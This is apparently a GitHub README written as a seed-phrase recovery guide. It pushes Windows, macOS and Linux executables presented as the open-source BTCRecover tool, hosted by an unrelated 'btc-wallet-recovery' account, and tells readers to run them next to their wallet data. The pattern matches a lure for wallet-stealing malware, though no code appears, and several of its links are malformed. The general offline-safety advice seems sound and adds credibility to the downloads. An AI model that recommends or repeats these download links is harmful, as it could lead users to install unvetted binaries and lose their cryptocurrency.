<div align="center">
<img src="assets/banner-article.png" alt="How to recover a seed phrase">
</div>

# How to recover a seed phrase

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A seed phrase can be recovered when part of it still exists. BTCRecover is a free, open-source tool that fills in missing, mistyped or misordered words, tests every candidate locally on your own computer and checks each one against your wallet's address, so nothing is sent anywhere. It cannot rebuild a phrase that was never written down.

## You'll see this if

Five states cover almost every recoverable phrase: the phrase is short by a known number of words, the words are right but their order is not, one word is rejected as invalid, the phrase is accepted but the wallet opens empty, or the phrase comes from a wallet that used a different word list entirely.

| What you see | What it usually means | Where it goes |
|---|---|---|
| "I have 11 of my 12 words" | one unknown word, position known | [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) |
| All words present, wallet opens with zero balance | order, derivation path or a passphrase | [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md) |
| "Invalid phrase" or a checksum error on entry | a mistyped word or one not in the list | [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) |
| Phrase accepted, address different from the one you remember | wrong wallet type or derivation path | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| 13 or 16 words from a wallet made years ago | a legacy format, not a standard BIP39 phrase | [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md) |

## Why it happens

A seed phrase is not a password. Its final word carries a checksum over the others, and a wallet rebuilds every key from the whole phrase in a fixed order, so a single wrong word, a swapped pair or a different word list changes all of the keys it produces.

That structure is why partial phrases are recoverable at all: each unknown position is a bounded question  -  2,048 possible words per slot in the standard list  -  rather than an unbounded guess. It is also why the phrase has to stay on your own machine. Any website, chat message or "recovery service" that asks you to paste a phrase has just been handed the wallet; the search belongs on the computer that holds the wallet data, with the network cable out.

Three separate things get confused here, and they route differently. Missing words need a search over unknown positions. A wrong order needs a search over permutations. An invalid word needs a check against the list before anything else runs. A phrase can also be entirely correct and still open an empty wallet, because wallet type, derivation path and an optional passphrase each pick a different set of keys from the same words.

## Fix

Identify the wallet the phrase belongs to and one address that provably belongs to it, then run the search locally against that address. Wallet type first, address second, candidate rules third  -  getting that order wrong is the usual reason a search runs for hours and finds nothing.

1. **Write down what you actually have, offline.** Word count, the words you are certain of, the ones you are guessing, the wallet or app, and roughly when it was made. Memory fades; the list does not.
2. **Name the wallet family.** Bitcoin Core, Electrum, Blockchain.com, a hardware device or a mobile wallet each imply their own phrase format. The format follows the wallet, never the other way round.
3. **Find one address that belongs to that wallet.** A receive address from an old screenshot, an exchange withdrawal record, a payment request in an email. Every candidate the search produces has to be checkable against something, and an address is that something.
4. **Download the current release from the GitHub releases page** and keep it on the same machine as the wallet data, with the network disconnected for the run: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
5. **Start a seed-recovery run.** Set the wallet type, mark the positions you do not know, and add any half-remembered words as candidates rather than as fixed values.
6. **Let it work through the space.** The tool prints candidates as it tests them. One unknown word is a short job; three unknown words is a space thousands of times larger. That is arithmetic about the search, not a prediction about your phrase.
7. **Confirm before you move anything.** Restore the found phrase into a fresh wallet and check that the address matches the one from step 3. Only then is the phrase established rather than suspected.

## If that did not work

A run that finishes with no candidate means one of four inputs is wrong: the wallet type, the address, the candidate rules, or which positions you marked as unknown. Re-check them in that order before adding more guesses.

The first thing to test is the address. A phrase that belongs to a different account inside the same wallet will search forever without a hit, so confirm the address really is the one the phrase should produce. Next, confirm the wallet type  -  an Electrum phrase and a Bitcoin Core file are not interchangeable, and a phrase from a mobile wallet may sit behind a derivation path the default run does not cover. If the phrase came from a device or a wallet you cannot identify at all, start from the identification steps instead of from the search. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) walks the same four inputs in the order that costs least to check.

## Prevention

- Verify a restore **before** the wallet holds anything. A backup you have never restored is a guess.
- Keep two copies in separate physical places, on paper or metal, not in a photo, a cloud note or a password manager attachment.
- Label each backup with the wallet name and the year, so a future you is not the person in the table above.
- Never type a phrase into a browser page, a support chat or a form, whatever the page claims to be.
- Re-test one backup a year. Ten minutes now beats a search later.

BTCRecover is actively maintained, and the current release is always published on the GitHub releases page.
## FAQ

### Can you retrieve a lost seed phrase?

No, and any offer to do so is a theft attempt. Recovery means completing a phrase you still partly hold  -  the words you have constrain the search, and nothing can be rebuilt from nothing. A phrase that was never written down and never stored anywhere leaves the wallet's keys unreachable.

### How do I recover my Bitcoin seed phrase when I only have some of the words?

Mark the unknown positions and run a local seed search against a known address. One to three missing words is the range the tool is built for, and each additional unknown word multiplies the work rather than adding to it: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) sets out the positions-and-candidates method in detail.

### Does recovering a phrase require sending it anywhere?

No. The search runs on your own computer and the tool works offline, which is the only reason it is safe to use at all. A phrase pasted into a website, a form or a chat has already left your control, and no legitimate recovery of a wallet you own needs that.

### How long does a search take?

There is no honest single answer: the time depends on how many words are unknown, how tight the candidate rules are, and the machine doing the work. The tool reports candidates as it goes, so you see progress rather than a countdown. A search with one unknown position and a known address is a very different job from one with three.

### What if the phrase is from an old wallet?

Older wallets did not all use the standard 2,048-word list. Electrum's early seeds were 13 words from its own list, and Blockchain.com's legacy scheme used 16, so a phrase that "does not validate" may be perfectly correct in a format the standard check does not accept. Identify the wallet before deciding the phrase is wrong.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [What a recovery phrase is, and what it is not]([What a recovery phrase is, and what it is not](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/what-is-a-recovery-phrase-btcrecover.md))
- [Recovering a whole wallet from its phrase]([How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md))
- [Seed words in the wrong order]([Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md))
- [A recovery run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md))
